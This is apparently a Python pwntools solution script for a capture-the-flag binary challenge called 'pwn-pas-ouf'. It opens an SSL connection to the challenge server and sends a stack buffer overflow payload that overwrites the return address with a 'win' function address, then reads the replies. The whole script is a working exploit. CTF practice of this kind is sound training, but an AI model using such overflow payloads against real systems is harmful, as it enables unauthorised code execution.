import socket
import ssl
from pwn import *

# proc = process("./pwn-pas-ouf")
# proc = gdb.debug("./pwn-pas-ouf", '''
#     break *0x4012a5
#     continue
# ''')

host = "main-5000-pwn-pas-ouf-03a2dd8bc54f67f9.ctf.4ts.fr"
port = 52525

# Create the remote connection
proc = remote(host, port)
sock = proc.sock

# Wrap the socket with SSL
context = ssl.create_default_context()
ssl_sock = context.wrap_socket(sock, server_hostname=host)

# remote connection to use the SSL socket
proc.sock = ssl_sock

win_address = 0x4011a0
payload = 128 * p8(0) + b'flag' + (280 - 128 - 4) * p8(0) + p64(win_address)

proc.sendlineafter(b"Hello World!", payload)
response = proc.recvline()
print(response)
response = proc.recvline()
print(response)
response = proc.recvline()
print(response)

proc.interactive()
